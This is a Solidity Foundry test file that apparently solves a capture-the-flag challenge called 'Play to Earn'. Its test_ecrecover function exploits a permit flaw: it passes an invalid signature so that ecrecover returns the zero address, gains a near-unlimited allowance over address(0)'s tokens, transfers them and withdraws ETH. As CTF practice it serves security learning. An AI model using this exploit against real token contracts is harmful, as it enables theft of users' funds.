pragma solidity 0.8.25;

import "../lib/forge-std/src/Test.sol";
import "../src/1-Play to Earn/Setup.sol";

import "../src/1-Play to Earn/Coin.sol";

contract sol is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    Setup setup;
    Coin coin;
    // Coin public coin;

    function setUp() public {
        vm.deal(address(deployer), 20 ether);
        vm.startPrank(deployer);
        setup = new Setup{value: 20 ether}();
        coin = Coin(setup.coin());
        vm.stopPrank();
        vm.startPrank(player);
        setup.register();
    }

    function test_setuoSuccess() public {
        assertEq(address(setup.player()), player);
        assertEq(setup.coin().balanceOf(player), 1337);
    }

    function test_ecrecover() public {
        vm.startPrank(player);
        coin.permit(
            address(0), address(player), type(uint256).max - 100, block.timestamp + 1 days, 26, bytes32(0), bytes32(0)
        );
        console.log("block:", block.timestamp + 1 days);
        console.log("allowance", coin.allowance(address(0), player));
        //console.log("addressOfSigner", signer);
        coin.transferFrom(address(0), address(player), 14 ether);
        console.log("balanceOfPlayer:%e", coin.balanceOf(player));
        console.logBytes32(bytes32(0));
        coin.withdraw(14 ether);
        console.log("balanceOfPlayer:%e", address(player).balance);
        assertEq(setup.isSolved(), true);
    }
}
